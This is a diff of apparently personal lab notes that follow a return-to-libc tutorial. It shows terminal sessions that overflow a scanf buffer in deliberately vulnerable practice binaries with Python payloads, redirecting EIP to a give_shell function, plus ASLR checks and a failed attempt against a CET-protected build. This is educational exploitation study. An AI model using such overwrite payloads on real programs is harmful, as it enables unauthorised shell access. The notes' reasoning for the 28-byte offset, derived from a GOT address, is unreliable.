@@ -1,6 +1,9 @@
 Source: https://www.youtube.com/watch?v=ruJXvxXzyU8
 Source git: https://github.com/nnamon/PracticalRet2Libc
 
+New one: https://www.youtube.com/watch?v=F4SwLKQI6Vs
+https://www.youtube.com/watch?v=5FJxC59hMRY
+
 1.
 root@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation# ./vuln1-nocanary-execstack  Makefile                  vuln1-execstack           vuln2                     vuln3.c
 vuln1-allprots            vuln1-nocanary            vuln2.c
@@ -29,9 +32,54 @@ ffefa000-fff1b000 rwxp 00000000 00:00 0                                  [stack]
 
 ffefa000-fff1b000 rwxp 00000000 00:00 0                                  [stack]
 
+```
+Why 28 bytes for the stack overflow attack to achieve the EIP for 32bit binary?
+
+Because,  it attacks the function "scanf("%s", password);"
+
+objump -D vuln2 and see it:
+"
+080491f6 <vuln>:
+
+...
+
+ 8049218:       e8 63 fe ff ff          call   8049080 <__isoc99_scanf@plt>
+
+->
+
+08049080 <__isoc99_scanf@plt>:
+ 8049080:       ff 25 1c c0 04 08       jmp    *0x804c01c
+ 8049086:       68 20 00 00 00          push   $0x20
+ 804908b:       e9 a0 ff ff ff          jmp    8049030 <_init+0x30>
+
+->
+
+Disassembly of section .got.plt:
+
+0804c000 <_GLOBAL_OFFSET_TABLE_>:
+ 804c000:       0c bf                   or     $0xbf,%al
+ 804c002:       04 08                   add    $0x8,%al
+        ...
+ 804c00c:       46                      inc    %esi
+ 804c00d:       90                      nop
+ 804c00e:       04 08                   add    $0x8,%al
+ 804c010:       56                      push   %esi
+ 804c011:       90                      nop
+ 804c012:       04 08                   add    $0x8,%al
+ 804c014:       66 90                   xchg   %ax,%ax
+ 804c016:       04 08                   add    $0x8,%al
+ 804c018:       76 90                   jbe    804bfaa <_DYNAMIC+0x9e>
+ 804c01a:       04 08                   add    $0x8,%al
+ 804c01c:       86                      .byte 0x86    //  jmp here and 0x1c to 00 is 28 bytes
+ 804c01d:       90                      nop
+ 804c01e:       04 08                   add    $0x8,%al
+"
 
 
-xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ python -c 'print "A"*28 + "BBBB"' | ./vuln2
+```
+
+
+xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ python2 -c 'print "A"*28 + "BBBB"' | ./vuln2
 What is the password:
 Incorrect password!
 Segmentation fault (core dumped)
@@ -74,7 +122,7 @@ xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ cat /proc/sys/
 2
 # value 2 means ASLR setting is enabled. Address Space Layout Randomization (ASLR) is a memory-protection process for operating systems that guards against buffer-overflow attacks. ... ASLR is used today on Linux, Windows, and MacOS systems.
 
-xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ python -c 'print "A"*28 + "BBBB"' | ./vuln2
+xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ python2 -c 'print "A"*28 + "BBBB"' | ./vuln2
 What is the password:
 Incorrect password!
 Segmentation fault (core dumped)
@@ -91,7 +139,7 @@ xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ objdump -d vul
 080484cb <give_shell>:
  8048536:       e8 90 ff ff ff          call   80484cb <give_shell>
 
-xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ (python -c 'import struct; print "A" * 28 + struct.pack("I", 0x080484cb)'; cat -) | ./vuln2
+xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ (python2 -c 'import struct; print "A" * 28 + struct.pack("I", 0x080484cb)'; cat -) | ./vuln2
 What is the password:
 Incorrect password!
 ls
@@ -106,7 +154,7 @@ Simple way to verify:
 objdump -d vuln22 | grep give_shell
 080484e6 <give_shell>:
  8048588:       e8 59 ff ff ff          call   80484e6 <give_shell>
-(python2 -c 'import struct; print A * 28 + struct.pack(I, 0x080484e6)'; cat -) | ./vuln22
+(python2 -c 'import struct; print "A" * 28 + struct.pack(I, 0x080484e6)'; cat -) | ./vuln22
 What is the password: 
 Incorrect password!
 Access give shell!
@@ -123,11 +171,11 @@ root@p-adls01 ~/cet_test/hack/rop_hack # ./hack2_cet.sh
 objdump -d vuln2_cet | grep give_shell
 080491f6 <give_shell>:
  8049279:       e8 78 ff ff ff          call   80491f6 <give_shell>
-(python2 -c 'import struct; print A * 28 + struct.pack(I, 0x080491f6)'; cat -) | ./vuln2_cet
+(python2 -c 'import struct; print A * 28 + struct.pack("I", 0x080491f6)'; cat -) | ./vuln2_cet
 What is the password: 
 Incorrect password!
 ls
-./hack2_cet.sh: line 6: 14728 Exit 141                ( python2 -c 'import struct; print "A" * 28 + struct.pack("I", 0x080491f6)'; cat - )
+./hack2_cet.sh: line 6: 14728 Exit 141                (python2 -c 'import struct; print "A" * 28 + struct.pack("I", 0x080491f6)'; cat - )
      14729 Segmentation fault      (core dumped) | ./vuln2_cet
 # dmesg | tail
 ...
